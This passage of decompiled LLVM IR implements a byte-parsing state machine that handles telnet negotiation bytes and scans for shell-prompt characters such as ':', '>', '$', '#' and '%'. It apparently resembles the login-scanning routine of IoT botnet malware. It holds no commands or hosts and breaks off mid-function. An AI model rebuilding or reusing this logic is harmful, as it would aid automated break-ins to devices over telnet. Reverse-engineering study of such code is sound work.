  %v2_804e0b528 = inttoptr i32 %v1_804e0b527 to i32*
  %v3_804e0b529 = load i32, i32* %v2_804e0b528, align 4
  store i32 %v3_804e0b529, i32* %eax.global-to-local, align 4
  %v1_804e0b830 = icmp eq i32 %v3_804e0b529, 0
  br i1 %v1_804e0b830, label %dec_label_pc_804e052, label %dec_label_pc_804e0bc

dec_label_pc_804e0bc:                             ; preds = %dec_label_pc_804e0b5.preheader, %dec_label_pc_804e0b5.backedge.dec_label_pc_804e0bc_crit_edge
  %v1_804e0bf = phi i32 [ %v1_804e0bf.pre, %dec_label_pc_804e0b5.backedge.dec_label_pc_804e0bc_crit_edge ], [ %v0_804e0a6, %dec_label_pc_804e0b5.preheader ]
  %v0_804e0bc = phi i32 [ %v0_804e0b5, %dec_label_pc_804e0b5.backedge.dec_label_pc_804e0bc_crit_edge ], [ %v0_804e0b526, %dec_label_pc_804e0b5.preheader ]
  %v1_804e0bc = add i32 %v0_804e0bc, 28
  store i32 %v1_804e0bc, i32* %eax.global-to-local, align 4
  %v2_804e0bf = add i32 %v1_804e0bf, 8
  %v3_804e0bf = inttoptr i32 %v2_804e0bf to i32*
  store i32 %v1_804e0bc, i32* %v3_804e0bf, align 4
  %v0_804e0c3 = load i32, i32* @edi, align 4
  %v1_804e0c3 = add i32 %v0_804e0c3, 24
  %v2_804e0c3 = inttoptr i32 %v1_804e0c3 to i32*
  %v3_804e0c3 = load i32, i32* %v2_804e0c3, align 4
  %v9_804e0c3 = icmp eq i32 %v3_804e0c3, 256
  br i1 %v9_804e0c3, label %dec_label_pc_804e659, label %dec_label_pc_804e0d0

dec_label_pc_804e0d0:                             ; preds = %dec_label_pc_804e0bc, %dec_label_pc_804e659
  %v0_804e0d0 = load i32, i32* @esp, align 4
  %v1_804e0d0 = add i32 %v0_804e0d0, 24
  %v2_804e0d0 = inttoptr i32 %v1_804e0d0 to i32*
  %v3_804e0d0 = load i32, i32* %v2_804e0d0, align 4
  store i32 %v3_804e0d0, i32* %ecx.global-to-local, align 4
  %v1_804e0d4 = add i32 %v0_804e0d0, 8
  %v2_804e0d4 = inttoptr i32 %v1_804e0d4 to i32*
  %v3_804e0d4 = load i32, i32* %v2_804e0d4, align 4
  store i32 %v3_804e0d4, i32* %ebx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v1_804e0dd = inttoptr i32 %v3_804e0d0 to i32*
  store i32 0, i32* %v1_804e0dd, align 4
  %v0_804e0e3 = load i32, i32* @edi, align 4
  %v1_804e0e3 = add i32 %v0_804e0e3, 24
  %v2_804e0e3 = inttoptr i32 %v1_804e0e3 to i32*
  %v3_804e0e3 = load i32, i32* %v2_804e0e3, align 4
  store i32 %v3_804e0e3, i32* %edx.global-to-local, align 4
  %v0_804e0e6 = load i32, i32* @esp, align 4
  %v1_804e0e6 = add i32 %v0_804e0e6, -4
  %v2_804e0e6 = inttoptr i32 %v1_804e0e6 to i32*
  store i32 16384, i32* %v2_804e0e6, align 4
  %v0_804e0eb = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e0eb = load i32, i32* %edx.global-to-local, align 4
  %v2_804e0eb = add i32 %v1_804e0eb, %v0_804e0eb
  store i32 %v2_804e0eb, i32* @ebx, align 4
  %v0_804e0ed = load i32, i32* %eax.global-to-local, align 4
  %v2_804e0ed = sub i32 %v0_804e0ed, %v1_804e0eb
  store i32 %v2_804e0ed, i32* %eax.global-to-local, align 4
  %v2_804e0ef = add i32 %v0_804e0e6, -8
  %v3_804e0ef = inttoptr i32 %v2_804e0ef to i32*
  store i32 %v2_804e0ed, i32* %v3_804e0ef, align 4
  %v0_804e0f0 = load i32, i32* @ebx, align 4
  %v2_804e0f0 = add i32 %v0_804e0e6, -12
  %v3_804e0f0 = inttoptr i32 %v2_804e0f0 to i32*
  store i32 %v0_804e0f0, i32* %v3_804e0f0, align 4
  %v0_804e0f1 = load i32, i32* @edi, align 4
  %v1_804e0f1 = add i32 %v0_804e0f1, 4
  %v2_804e0f1 = inttoptr i32 %v1_804e0f1 to i32*
  %v3_804e0f1 = load i32, i32* %v2_804e0f1, align 4
  store i32 %v3_804e0f1, i32* @esi, align 4
  %v2_804e0f4 = add i32 %v0_804e0e6, -16
  %v3_804e0f4 = inttoptr i32 %v2_804e0f4 to i32*
  store i32 %v3_804e0f1, i32* %v3_804e0f4, align 4
  %v0_804e0f5 = call i32 @function_804ff7d()
  store i32 %v0_804e0f5, i32* %eax.global-to-local, align 4
  %v0_804e0fa = load i32, i32* @esp, align 4
  %v1_804e0fa = add i32 %v0_804e0fa, 16
  %tmp129 = icmp slt i32 %v0_804e0f5, 1
  br i1 %tmp129, label %dec_label_pc_804e553, label %dec_label_pc_804e106

dec_label_pc_804e106:                             ; preds = %dec_label_pc_804e0d0
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e108

dec_label_pc_804e108:                             ; preds = %dec_label_pc_804e112, %dec_label_pc_804e106
  %v0_804e10e = phi i32 [ %v1_804e112, %dec_label_pc_804e112 ], [ 0, %dec_label_pc_804e106 ]
  %v1_804e108 = load i32, i32* @ebx, align 4
  %v2_804e108 = add i32 %v1_804e108, %v0_804e10e
  %v3_804e108 = inttoptr i32 %v2_804e108 to i8*
  %v4_804e108 = load i8, i8* %v3_804e108, align 1
  %v5_804e108 = icmp eq i8 %v4_804e108, 0
  %v1_804e10c = icmp eq i1 %v5_804e108, false
  br i1 %v1_804e10c, label %dec_label_pc_804e112, label %dec_label_pc_804e10e

dec_label_pc_804e10e:                             ; preds = %dec_label_pc_804e108
  store i8 65, i8* %v3_804e108, align 1
  %v0_804e112.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e112

dec_label_pc_804e112:                             ; preds = %dec_label_pc_804e108, %dec_label_pc_804e10e
  %v0_804e112 = phi i32 [ %v0_804e10e, %dec_label_pc_804e108 ], [ %v0_804e112.pre, %dec_label_pc_804e10e ]
  %v1_804e112 = add i32 %v0_804e112, 1
  store i32 %v1_804e112, i32* %edx.global-to-local, align 4
  %v12_804e113 = icmp eq i32 %v0_804e0f5, %v1_804e112
  %v1_804e115 = icmp eq i1 %v12_804e113, false
  br i1 %v1_804e115, label %dec_label_pc_804e108, label %dec_label_pc_804e117

dec_label_pc_804e117:                             ; preds = %dec_label_pc_804e112, %dec_label_pc_804e559
  %v0_804e117 = load i32, i32* @edi, align 4
  %v1_804e117 = add i32 %v0_804e117, 24
  %v2_804e117 = inttoptr i32 %v1_804e117 to i32*
  %v3_804e117 = load i32, i32* %v2_804e117, align 4
  %v2_804e11a = add i32 %v3_804e117, %v0_804e0f5
  store i32 %v2_804e11a, i32* %edx.global-to-local, align 4
  %v0_804e11c = load i32, i32* @global_var_8053a50.9, align 16
  store i32 %v0_804e11c, i32* %eax.global-to-local, align 4
  store i32 %v2_804e11a, i32* %v2_804e117, align 4
  %v0_804e124 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e124 = load i32, i32* @edi, align 4
  %v2_804e124 = add i32 %v1_804e124, 8
  %v3_804e124 = inttoptr i32 %v2_804e124 to i32*
  store i32 %v0_804e124, i32* %v3_804e124, align 4
  br label %dec_label_pc_804e127

dec_label_pc_804e127:                             ; preds = %dec_label_pc_804e423, %dec_label_pc_804e117
  %v0_804e127 = load i32, i32* @edi, align 4
  %v1_804e127 = add i32 %v0_804e127, 12
  %v2_804e127 = inttoptr i32 %v1_804e127 to i32*
  %v3_804e127 = load i32, i32* %v2_804e127, align 4
  store i32 %v3_804e127, i32* %eax.global-to-local, align 4
  switch i32 %v3_804e127, label %dec_label_pc_804e0b5.backedge [
    i32 2, label %dec_label_pc_804e137
    i32 3, label %dec_label_pc_804e1ca
    i32 4, label %dec_label_pc_804e210
    i32 5, label %dec_label_pc_804e250
    i32 6, label %dec_label_pc_804e2e0
    i32 7, label %dec_label_pc_804e443
    i32 8, label %dec_label_pc_804e295
    i32 9, label %dec_label_pc_804e488
    i32 10, label %dec_label_pc_804e397
  ]

dec_label_pc_804e137:                             ; preds = %dec_label_pc_804e127
  %v0_804e137 = load i32, i32* @esp, align 4
  %v1_804e137 = add i32 %v0_804e137, 8
  %v2_804e137 = inttoptr i32 %v1_804e137 to i32*
  %v3_804e137 = load i32, i32* %v2_804e137, align 4
  store i32 %v3_804e137, i32* @ebx, align 4
  store i32 0, i32* @esi, align 4
  %v1_804e13d = add i32 %v0_804e127, 24
  %v2_804e13d = inttoptr i32 %v1_804e13d to i32*
  %v3_804e13d = load i32, i32* %v2_804e13d, align 4
  store i32 %v3_804e13d, i32* %edx.global-to-local, align 4
  %v2_804e14017 = sub i32 0, %v3_804e13d
  %v10_804e14021 = and i32 %v3_804e13d, %v2_804e14017
  %v11_804e14022 = icmp slt i32 %v10_804e14021, 0
  %v13_804e14024 = icmp slt i32 %v2_804e14017, 0
  %v2_804e14225 = icmp eq i1 %v13_804e14024, %v11_804e14022
  br i1 %v2_804e14225, label %dec_label_pc_804e0b5.backedge, label %dec_label_pc_804e144.preheader

dec_label_pc_804e144.preheader:                   ; preds = %dec_label_pc_804e137, %dec_label_pc_804e140.backedge
  %v0_804e1be118 = phi i32 [ %v0_804e1be120, %dec_label_pc_804e140.backedge ], [ %v0_804e127, %dec_label_pc_804e137 ]
  %v0_804e542111 = phi i32 [ %v0_804e140, %dec_label_pc_804e140.backedge ], [ 0, %dec_label_pc_804e137 ]
  %v5_804e156108 = phi i32 [ %v5_804e156109, %dec_label_pc_804e140.backedge ], [ 2, %dec_label_pc_804e137 ]
  %v1_804e150106 = phi i32 [ %v1_804e140, %dec_label_pc_804e140.backedge ], [ %v3_804e13d, %dec_label_pc_804e137 ]
  %v0_804e149103 = phi i32 [ %v0_804e149104, %dec_label_pc_804e140.backedge ], [ %v0_804e137, %dec_label_pc_804e137 ]
  br label %dec_label_pc_804e144

dec_label_pc_804e144:                             ; preds = %dec_label_pc_804e144.preheader, %dec_label_pc_804e195
  %v0_804e1be121 = phi i32 [ %v0_804e1be118, %dec_label_pc_804e144.preheader ], [ %v0_804e1ac, %dec_label_pc_804e195 ]
  %v0_804e542 = phi i32 [ %v0_804e542111, %dec_label_pc_804e144.preheader ], [ %v0_804e1b2, %dec_label_pc_804e195 ]
  %v5_804e156 = phi i32 [ %v5_804e156108, %dec_label_pc_804e144.preheader ], [ %v0_804e1a7, %dec_label_pc_804e195 ]
  %v1_804e150 = phi i32 [ %v1_804e150106, %dec_label_pc_804e144.preheader ], [ %v3_804e1ac, %dec_label_pc_804e195 ]
  %v0_804e5b8 = phi i32 [ %v0_804e149103, %dec_label_pc_804e144.preheader ], [ %v1_804e1af, %dec_label_pc_804e195 ]
  %v0_804e144 = load i32, i32* @ebx, align 4
  %v1_804e144 = inttoptr i32 %v0_804e144 to i8*
  %v2_804e144 = load i8, i8* %v1_804e144, align 1
  %v12_804e144 = icmp eq i8 %v2_804e144, -1
  %v1_804e147 = icmp eq i1 %v12_804e144, false
  br i1 %v1_804e147, label %dec_label_pc_804e1b6, label %dec_label_pc_804e149

dec_label_pc_804e149:                             ; preds = %dec_label_pc_804e144
  %v1_804e149 = add i32 %v0_804e5b8, 8
  %v2_804e149 = inttoptr i32 %v1_804e149 to i32*
  %v3_804e149 = load i32, i32* %v2_804e149, align 4
  %v1_804e14d = add i32 %v0_804e144, 1
  store i32 %v1_804e14d, i32* %ecx.global-to-local, align 4
  %v2_804e150 = add i32 %v3_804e149, %v1_804e150
  %tmp305 = icmp ugt i32 %v2_804e150, %v1_804e14d
  br i1 %tmp305, label %dec_label_pc_804e156, label %dec_label_pc_804e1b6

dec_label_pc_804e156:                             ; preds = %dec_label_pc_804e149
  %v2_804e156 = inttoptr i32 %v1_804e14d to i8*
  %v3_804e156 = load i8, i8* %v2_804e156, align 1
  %v4_804e156 = zext i8 %v3_804e156 to i32
  %v6_804e156 = and i32 %v5_804e156, -256
  %v7_804e156 = or i32 %v4_804e156, %v6_804e156
  store i32 %v7_804e156, i32* %eax.global-to-local, align 4
  switch i8 %v3_804e156, label %dec_label_pc_804e169 [
    i8 -1, label %dec_label_pc_804e53f
    i8 -3, label %dec_label_pc_804e5b8
  ]

dec_label_pc_804e169:                             ; preds = %dec_label_pc_804e156
  %v1_804e169 = add i32 %v0_804e144, 2
  store i32 %v1_804e169, i32* %eax.global-to-local, align 4
  %tmp306 = icmp ugt i32 %v2_804e150, %v1_804e169
  br i1 %tmp306, label %dec_label_pc_804e170, label %dec_label_pc_804e1b6

dec_label_pc_804e170:                             ; preds = %dec_label_pc_804e169, %dec_label_pc_804ec2a, %dec_label_pc_804ec32, %dec_label_pc_804e640
  %v0_804e170 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e170 = inttoptr i32 %v0_804e170 to i8*
  %v2_804e170 = load i8, i8* %v1_804e170, align 1
  %v3_804e170 = zext i8 %v2_804e170 to i32
  %v4_804e170 = load i32, i32* %eax.global-to-local, align 4
  %v5_804e170 = and i32 %v4_804e170, -256
  %v6_804e170 = or i32 %v5_804e170, %v3_804e170
  store i32 %v6_804e170, i32* %eax.global-to-local, align 4
  switch i8 %v2_804e170, label %dec_label_pc_804e182 [
    i8 -3, label %dec_label_pc_804e5b0
    i8 -5, label %dec_label_pc_804e651
  ]

dec_label_pc_804e182:                             ; preds = %dec_label_pc_804e170, %dec_label_pc_804e651, %dec_label_pc_804e5b0
  %v0_804e182 = load i32, i32* @ebx, align 4
  %v1_804e182 = add i32 %v0_804e182, 2
  %v2_804e182 = inttoptr i32 %v1_804e182 to i8*
  %v3_804e182 = load i8, i8* %v2_804e182, align 1
  %v4_804e182 = zext i8 %v3_804e182 to i32
  %v5_804e182 = load i32, i32* %eax.global-to-local, align 4
  %v6_804e182 = and i32 %v5_804e182, -256
  %v7_804e182 = or i32 %v6_804e182, %v4_804e182
  store i32 %v7_804e182, i32* %eax.global-to-local, align 4
  switch i8 %v3_804e182, label %dec_label_pc_804e195 [
    i8 -3, label %dec_label_pc_804e54a
    i8 -5, label %dec_label_pc_804e648
  ]

dec_label_pc_804e195:                             ; preds = %dec_label_pc_804e182, %dec_label_pc_804e648, %dec_label_pc_804e54a
  %v0_804e195 = load i32, i32* @esp, align 4
  %v1_804e195 = add i32 %v0_804e195, -4
  %v2_804e195 = inttoptr i32 %v1_804e195 to i32*
  store i32 16384, i32* %v2_804e195, align 4
  %v1_804e19a = add i32 %v0_804e195, -8
  %v2_804e19a = inttoptr i32 %v1_804e19a to i32*
  store i32 3, i32* %v2_804e19a, align 4
  %v0_804e19c = load i32, i32* @ebx, align 4
  %v2_804e19c = add i32 %v0_804e195, -12
  %v3_804e19c = inttoptr i32 %v2_804e19c to i32*
  store i32 %v0_804e19c, i32* %v3_804e19c, align 4
  %v0_804e19d = load i32, i32* @esi, align 4
  %v1_804e19d = add i32 %v0_804e19d, 3
  store i32 %v1_804e19d, i32* @esi, align 4
  %v0_804e1a0 = load i32, i32* @edi, align 4
  %v1_804e1a0 = add i32 %v0_804e1a0, 4
  %v2_804e1a0 = inttoptr i32 %v1_804e1a0 to i32*
  %v3_804e1a0 = load i32, i32* %v2_804e1a0, align 4
  %v0_804e1a3 = load i32, i32* @ebx, align 4
  %v1_804e1a3 = add i32 %v0_804e1a3, 3
  store i32 %v1_804e1a3, i32* @ebx, align 4
  %v2_804e1a6 = add i32 %v0_804e195, -16
  %v3_804e1a6 = inttoptr i32 %v2_804e1a6 to i32*
  store i32 %v3_804e1a0, i32* %v3_804e1a6, align 4
  %v0_804e1a7 = call i32 @function_804fff3()
  store i32 %v0_804e1a7, i32* %eax.global-to-local, align 4
  %v0_804e1ac = load i32, i32* @edi, align 4
  %v1_804e1ac = add i32 %v0_804e1ac, 24
  %v2_804e1ac = inttoptr i32 %v1_804e1ac to i32*
  %v3_804e1ac = load i32, i32* %v2_804e1ac, align 4
  store i32 %v3_804e1ac, i32* %edx.global-to-local, align 4
  %v0_804e1af = load i32, i32* @esp, align 4
  %v1_804e1af = add i32 %v0_804e1af, 16
  %v0_804e1b2 = load i32, i32* @esi, align 4
  %v2_804e1b2 = sub i32 %v0_804e1b2, %v3_804e1ac
  %v8_804e1b2 = xor i32 %v0_804e1b2, %v3_804e1ac
  %v9_804e1b2 = xor i32 %v2_804e1b2, %v0_804e1b2
  %v10_804e1b2 = and i32 %v9_804e1b2, %v8_804e1b2
  %v11_804e1b2 = icmp slt i32 %v10_804e1b2, 0
  %v13_804e1b2 = icmp slt i32 %v2_804e1b2, 0
  %v2_804e1b4 = icmp eq i1 %v13_804e1b2, %v11_804e1b2
  br i1 %v2_804e1b4, label %dec_label_pc_804e1b6, label %dec_label_pc_804e144

dec_label_pc_804e1b6:                             ; preds = %dec_label_pc_804e140.backedge, %dec_label_pc_804e169, %dec_label_pc_804e149, %dec_label_pc_804e195, %dec_label_pc_804e144, %dec_label_pc_804e5b8.dec_label_pc_804e1b6.loopexit_crit_edge
  %v0_804e1be = phi i32 [ %v0_804e61c, %dec_label_pc_804e5b8.dec_label_pc_804e1b6.loopexit_crit_edge ], [ %v0_804e1ac, %dec_label_pc_804e195 ], [ %v0_804e1be121, %dec_label_pc_804e169 ], [ %v0_804e1be121, %dec_label_pc_804e149 ], [ %v0_804e1be121, %dec_label_pc_804e144 ], [ %v0_804e1be120, %dec_label_pc_804e140.backedge ]
  %v0_804e1b6 = phi i32 [ %v0_804e1b6.pre.pre, %dec_label_pc_804e5b8.dec_label_pc_804e1b6.loopexit_crit_edge ], [ %v0_804e1b2, %dec_label_pc_804e195 ], [ %v0_804e542, %dec_label_pc_804e169 ], [ %v0_804e542, %dec_label_pc_804e149 ], [ %v0_804e542, %dec_label_pc_804e144 ], [ %v0_804e140, %dec_label_pc_804e140.backedge ]
  %tmp130 = icmp slt i32 %v0_804e1b6, 1
  br i1 %tmp130, label %dec_label_pc_804e729, label %dec_label_pc_804e1be

dec_label_pc_804e1be:                             ; preds = %dec_label_pc_804e1b6
  %v1_804e1be = add i32 %v0_804e1be, 12
  %v2_804e1be = inttoptr i32 %v1_804e1be to i32*
  store i32 3, i32* %v2_804e1be, align 4
  br label %dec_label_pc_804e418

dec_label_pc_804e1ca:                             ; preds = %dec_label_pc_804e127
  %v1_804e1ca = add i32 %v0_804e127, 24
  %v2_804e1ca = inttoptr i32 %v1_804e1ca to i32*
  %v3_804e1ca = load i32, i32* %v2_804e1ca, align 4
  %v1_804e1cd = add i32 %v3_804e1ca, -1
  store i32 %v1_804e1cd, i32* %eax.global-to-local, align 4
  %tmp131 = icmp slt i32 %v1_804e1cd, 1
  br i1 %tmp131, label %dec_label_pc_804e7b7, label %dec_label_pc_804e1d6.preheader

dec_label_pc_804e1d6.preheader:                   ; preds = %dec_label_pc_804e1ca
  %v7_804e1d6.pre = load i32, i32* %edx.global-to-local, align 4
  %v2_804e1d6 = add i32 %v0_804e127, 28
  br label %dec_label_pc_804e1d6

dec_label_pc_804e1d6:                             ; preds = %dec_label_pc_804e1d6.preheader, %dec_label_pc_804e207
  %v7_804e1d6 = phi i32 [ %v7_804e1d6.pre, %dec_label_pc_804e1d6.preheader ], [ %v9_804e1d6, %dec_label_pc_804e207 ]
  %v0_804e7ab = phi i32 [ %v1_804e1cd, %dec_label_pc_804e1d6.preheader ], [ %v1_804e207, %dec_label_pc_804e207 ]
  %v3_804e1d6 = add i32 %v2_804e1d6, %v0_804e7ab
  %v4_804e1d6 = inttoptr i32 %v3_804e1d6 to i8*
  %v5_804e1d6 = load i8, i8* %v4_804e1d6, align 1
  %v6_804e1d6 = zext i8 %v5_804e1d6 to i32
  %v8_804e1d6 = and i32 %v7_804e1d6, -256
  %v9_804e1d6 = or i32 %v6_804e1d6, %v8_804e1d6
  store i32 %v9_804e1d6, i32* %edx.global-to-local, align 4
  switch i8 %v5_804e1d6, label %dec_label_pc_804e207 [
    i8 58, label %dec_label_pc_804e7ab
    i8 62, label %dec_label_pc_804e7ab
    i8 36, label %dec_label_pc_804e7ab
    i8 35, label %dec_label_pc_804e7ab
    i8 37, label %dec_label_pc_804e7ab
  ]

dec_label_pc_804e207:                             ; preds = %dec_label_pc_804e1d6
  %v1_804e207 = add i32 %v0_804e7ab, -1
  %v8_804e207 = icmp eq i32 %v1_804e207, 0
  store i32 %v1_804e207, i32* %eax.global-to-local, align 4
  %v1_804e208 = icmp eq i1 %v8_804e207, false
  br i1 %v1_804e208, label %dec_label_pc_804e1d6, label %dec_label_pc_804e7b7

dec_label_pc_804e210:                             ; preds = %dec_label_pc_804e127
  %v1_804e210 = add i32 %v0_804e127, 24
  %v2_804e210 = inttoptr i32 %v1_804e210 to i32*
  %v3_804e210 = load i32, i32* %v2_804e210, align 4
  %v1_804e213 = add i32 %v3_804e210, -1
  store i32 %v1_804e213, i32* %eax.global-to-local, align 4
  %tmp132 = icmp slt i32 %v1_804e213, 1
  br i1 %tmp132, label %dec_label_pc_804e688, label %dec_label_pc_804e21c.preheader

dec_label_pc_804e21c.preheader:                   ; preds = %dec_label_pc_804e210
  %v7_804e21c.pre = load i32, i32* %edx.global-to-local, align 4
  %v2_804e21c = add i32 %v0_804e127, 28
  br label %dec_label_pc_804e21c

dec_label_pc_804e21c:                             ; preds = %dec_label_pc_804e21c.preheader, %dec_label_pc_804e244
  %v7_804e21c = phi i32 [ %v7_804e21c.pre, %dec_label_pc_804e21c.preheader ], [ %v9_804e21c, %dec_label_pc_804e244 ]
  %v0_804e67c = phi i32 [ %v1_804e213, %dec_label_pc_804e21c.preheader ], [ %v1_804e244, %dec_label_pc_804e244 ]
  %v3_804e21c = add i32 %v2_804e21c, %v0_804e67c
  %v4_804e21c = inttoptr i32 %v3_804e21c to i8*
  %v5_804e21c = load i8, i8* %v4_804e21c, align 1
  %v6_804e21c = zext i8 %v5_804e21c to i32
  %v8_804e21c = and i32 %v7_804e21c, -256
  %v9_804e21c = or i32 %v6_804e21c, %v8_804e21c
  store i32 %v9_804e21c, i32* %edx.global-to-local, align 4
  switch i8 %v5_804e21c, label %dec_label_pc_804e244 [
    i8 58, label %dec_label_pc_804e67c
    i8 62, label %dec_label_pc_804e67c
    i8 36, label %dec_label_pc_804e67c
    i8 35, label %dec_label_pc_804e67c
  ]

dec_label_pc_804e244:                             ; preds = %dec_label_pc_804e21c
  %v1_804e244 = add i32 %v0_804e67c, -1
  %v8_804e244 = icmp eq i32 %v1_804e244, 0
  store i32 %v1_804e244, i32* %eax.global-to-local, align 4
  %v1_804e245 = icmp eq i1 %v8_804e244, false
  br i1 %v1_804e245, label %dec_label_pc_804e21c, label %dec_label_pc_804e688

dec_label_pc_804e250:                             ; preds = %dec_label_pc_804e127
  %v1_804e250 = add i32 %v0_804e127, 24
  %v2_804e250 = inttoptr i32 %v1_804e250 to i32*
  %v3_804e250 = load i32, i32* %v2_804e250, align 4
  %v1_804e253 = add i32 %v3_804e250, -1
  store i32 %v1_804e253, i32* %eax.global-to-local, align 4
  %tmp133 = icmp slt i32 %v1_804e253, 1
  br i1 %tmp133, label %dec_label_pc_804e0b5.backedge, label %dec_label_pc_804e25c.preheader

dec_label_pc_804e25c.preheader:                   ; preds = %dec_label_pc_804e250
  %v7_804e25c.pre = load i32, i32* %edx.global-to-local, align 4
  %v2_804e25c = add i32 %v0_804e127, 28
  br label %dec_label_pc_804e25c

dec_label_pc_804e25c:                             ; preds = %dec_label_pc_804e25c.preheader, %dec_label_pc_804e28d
  %v7_804e25c = phi i32 [ %v7_804e25c.pre, %dec_label_pc_804e25c.preheader ], [ %v9_804e25c, %dec_label_pc_804e28d ]
  %v0_804e984 = phi i32 [ %v1_804e253, %dec_label_pc_804e25c.preheader ], [ %v1_804e28d, %dec_label_pc_804e28d ]
  %v3_804e25c = add i32 %v2_804e25c, %v0_804e984
  %v4_804e25c = inttoptr i32 %v3_804e25c to i8*
  %v5_804e25c = load i8, i8* %v4_804e25c, align 1
  %v6_804e25c = zext i8 %v5_804e25c to i32
  %v8_804e25c = and i32 %v7_804e25c, -256
  %v9_804e25c = or i32 %v6_804e25c, %v8_804e25c
  store i32 %v9_804e25c, i32* %edx.global-to-local, align 4
  switch i8 %v5_804e25c, label %dec_label_pc_804e28d [
    i8 58, label %dec_label_pc_804e984
    i8 62, label %dec_label_pc_804e984
    i8 36, label %dec_label_pc_804e984
    i8 35, label %dec_label_pc_804e984
    i8 37, label %dec_label_pc_804e984
  ]

dec_label_pc_804e28d:                             ; preds = %dec_label_pc_804e25c
  %v1_804e28d = add i32 %v0_804e984, -1
  %v8_804e28d = icmp eq i32 %v1_804e28d, 0
  store i32 %v1_804e28d, i32* %eax.global-to-local, align 4
  %v1_804e28e = icmp eq i1 %v8_804e28d, false
  br i1 %v1_804e28e, label %dec_label_pc_804e25c, label %dec_label_pc_804e0b5.backedge

dec_label_pc_804e295:                             ; preds = %dec_label_pc_804e127
  %v1_804e295 = add i32 %v0_804e127, 24
  %v2_804e295 = inttoptr i32 %v1_804e295 to i32*
  %v3_804e295 = load i32, i32* %v2_804e295, align 4
  %v1_804e298 = add i32 %v3_804e295, -1
  store i32 %v1_804e298, i32* %eax.global-to-local, align 4
  %tmp134 = icmp slt i32 %v1_804e298, 1
  br i1 %tmp134, label %dec_label_pc_804e0b5.backedge, label %dec_label_pc_804e2a1.preheader

dec_label_pc_804e2a1.preheader:                   ; preds = %dec_label_pc_804e295
  %v7_804e2a1.pre = load i32, i32* %edx.global-to-local, align 4
  %v2_804e2a1 = add i32 %v0_804e127, 28
  br label %dec_label_pc_804e2a1

dec_label_pc_804e2a1:                             ; preds = %dec_label_pc_804e2a1.preheader, %dec_label_pc_804e2d2
  %v7_804e2a1 = phi i32 [ %v7_804e2a1.pre, %dec_label_pc_804e2a1.preheader ], [ %v9_804e2a1, %dec_label_pc_804e2d2 ]
  %v0_804e736 = phi i32 [ %v1_804e298, %dec_label_pc_804e2a1.preheader ], [ %v1_804e2d2, %dec_label_pc_804e2d2 ]
  %v3_804e2a1 = add i32 %v2_804e2a1, %v0_804e736
  %v4_804e2a1 = inttoptr i32 %v3_804e2a1 to i8*
  %v5_804e2a1 = load i8, i8* %v4_804e2a1, align 1
  %v6_804e2a1 = zext i8 %v5_804e2a1 to i32
  %v8_804e2a1 = and i32 %v7_804e2a1, -256
  %v9_804e2a1 = or i32 %v6_804e2a1, %v8_804e2a1
  store i32 %v9_804e2a1, i32* %edx.global-to-local, align 4
  switch i8 %v5_804e2a1, label %dec_label_pc_804e2d2 [
    i8 58, label %dec_label_pc_804e736
    i8 62, label %dec_label_pc_804e736
    i8 36, label %dec_label_pc_804e736
    i8 35, label %dec_label_pc_804e736
    i8 37, label %dec_label_pc_804e736
  ]

dec_label_pc_804e2d2:                             ; preds = %dec_label_pc_804e2a1
  %v1_804e2d2 = add i32 %v0_804e736, -1
  %v8_804e2d2 = icmp eq i32 %v1_804e2d2, 0
  store i32 %v1_804e2d2, i32* %eax.global-to-local, align 4
  %v1_804e2d3 = icmp eq i1 %v8_804e2d2, false
  br i1 %v1_804e2d3, label %dec_label_pc_804e2a1, label %dec_label_pc_804e0b5.backedge

dec_label_pc_804e2e0:                             ; preds = %dec_label_pc_804e127
  %v1_804e2e0 = add i32 %v0_804e127, 24
  %v2_804e2e0 = inttoptr i32 %v1_804e2e0 to i32*
  %v3_804e2e0 = load i32, i32* %v2_804e2e0, align 4
  %v1_804e2e3 = add i32 %v3_804e2e0, -1
  store i32 %v1_804e2e3, i32* %eax.global-to-local, align 4
  %tmp135 = icmp slt i32 %v1_804e2e3, 1
  br i1 %tmp135, label %dec_label_pc_804e0b5.backedge, label %dec_label_pc_804e2ec

dec_label_pc_804e2ec:                             ; preds = %dec_label_pc_804e2e0
  %v2_804e2ec = add i32 %v0_804e127, 27
  %v3_804e2ec = add i32 %v2_804e2ec, %v3_804e2e0
  %v4_804e2ec = inttoptr i32 %v3_804e2ec to i8*
  %v5_804e2ec = load i8, i8* %v4_804e2ec, align 1
  %v6_804e2ec = zext i8 %v5_804e2ec to i32
  %v7_804e2ec = load i32, i32* %edx.global-to-local, align 4
  %v8_804e2ec = and i32 %v7_804e2ec, -256
  %v9_804e2ec = or i32 %v8_804e2ec, %v6_804e2ec
  store i32 %v9_804e2ec, i32* %edx.global-to-local, align 4
  switch i8 %v5_804e2ec, label %dec_label_pc_804e2fa [
    i8 62, label %dec_label_pc_804e31e.thread
    i8 58, label %dec_label_pc_804e31e.thread
  ]

dec_label_pc_804e2fa:                             ; preds = %dec_label_pc_804e2ec, %dec_label_pc_804e310
  %v0_804e309 = phi i32 [ %v1_804e309, %dec_label_pc_804e310 ], [ %v1_804e2e3, %dec_label_pc_804e2ec ]
  %v7_804e310 = phi i32 [ %v9_804e310, %dec_label_pc_804e310 ], [ %v9_804e2ec, %dec_label_pc_804e2ec ]
  %v1_804e2fa = trunc i32 %v7_804e310 to i8
  %v1_804e2fa.off = add i8 %v1_804e2fa, -35
  %switch167 = icmp ult i8 %v1_804e2fa.off, 3
  br i1 %switch167, label %dec_label_pc_804e31e, label %dec_label_pc_804e309

dec_label_pc_804e309:                             ; preds = %dec_label_pc_804e2fa
  %v1_804e309 = add i32 %v0_804e309, -1
  %v8_804e309 = icmp eq i32 %v1_804e309, 0
  store i32 %v1_804e309, i32* %eax.global-to-local, align 4
  br i1 %v8_804e309, label %dec_label_pc_804e0b5.backedge, label %dec_label_pc_804e310

dec_label_pc_804e310:                             ; preds = %dec_label_pc_804e309
  %v3_804e310 = add i32 %v2_804e2ec, %v0_804e309
  %v4_804e310 = inttoptr i32 %v3_804e310 to i8*
  %v5_804e310 = load i8, i8* %v4_804e310, align 1
  %v6_804e310 = zext i8 %v5_804e310 to i32
  %v8_804e310 = and i32 %v7_804e310, -256
  %v9_804e310 = or i32 %v6_804e310, %v8_804e310
  store i32 %v9_804e310, i32* %edx.global-to-local, align 4
